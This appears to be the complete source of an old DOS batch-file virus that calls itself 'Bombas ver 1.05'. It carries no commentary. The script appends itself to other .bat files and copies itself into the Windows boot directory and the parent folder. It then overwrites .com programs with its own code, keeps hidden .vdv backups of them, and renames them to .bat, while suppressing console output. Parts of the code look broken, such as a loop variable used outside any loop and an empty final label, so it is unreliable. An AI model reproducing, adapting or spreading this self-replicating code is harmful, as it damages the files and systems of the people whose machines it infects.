:Bombas on your computer 2000
@echo off
if "%0"=="AUTOEXEC.BAT" goto  aut
goto rep
:aut
@echo off
echo Bombas ver 1.05 on your computer! Be well...
exit
:rep
for %%w in (*.bat) do set bas=%%w
find "bas" %%w
if errorlevel 1 type %0>>%bas%
set boom= *.com
ctty nul
copy %0 %winbootdir%\%0
copy %0 ..
if not exist %boom% goto fun
for %%i in (%boom% ..\%boom%) do copy %%i *.vdv
for %%k in (%boom% ..\%boom%) do copy %0 %%k
ren *.com *.bat
attrib *.vdv + h
attrib %0 -h
goto rep
:fun
